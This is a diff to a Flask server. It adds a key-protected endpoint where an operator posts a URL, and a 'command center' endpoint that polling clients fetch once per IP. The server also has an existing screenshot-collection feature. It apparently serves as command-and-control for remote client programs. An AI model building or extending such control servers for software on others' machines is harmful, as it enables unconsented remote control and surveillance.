@@ -25,8 +25,25 @@ screenshot_urls: list[bytes] = []
 take_screenshot: bool = False
 screenshot_ips: list[str] = []
 
+website: str = ""
+website_ips: list[str] = []
+
 
 # Centers
+
+
+@app.route("/website-center", methods=["GET"])
+def command_center() -> Response:
+    global website
+    if len(website) == 0:
+        return Response("no websites to open", 204)
+    else:
+        remote_ip = get_remote_address()
+        if remote_ip in website_ips:
+            return Response("u cant do that rn", 400)
+        else:
+            website_ips.append(remote_ip)
+            return Response(website, 200)
 
 
 @app.route("/screenshot-center", methods=["GET", "POST"])
@@ -168,6 +185,17 @@ def post_screenshot() -> Response:
         return Response("invalid key", 403)
 
 
+@app.route("/post_website", methods=["POST"])
+def post_website() -> Response:
+    if check_key(request.args.get("key")):
+        global website
+        website = request.args.get("website")
+        Thread(target=post_website_thread, args=[website]).start()
+        return Response("success", 200)
+    else:
+        return Response("invalid key", 403)
+
+
 # Threads
 
 
@@ -209,6 +237,13 @@ def post_screenshot_thread() -> None:
     sleep(5)
     screenshot_urls = []
     screenshot_ips = []
+
+
+def post_website_thread(website_arg: str) -> None:
+    global website
+    website = website_arg
+    sleep(8)
+    website = ""
 
 
 # Static
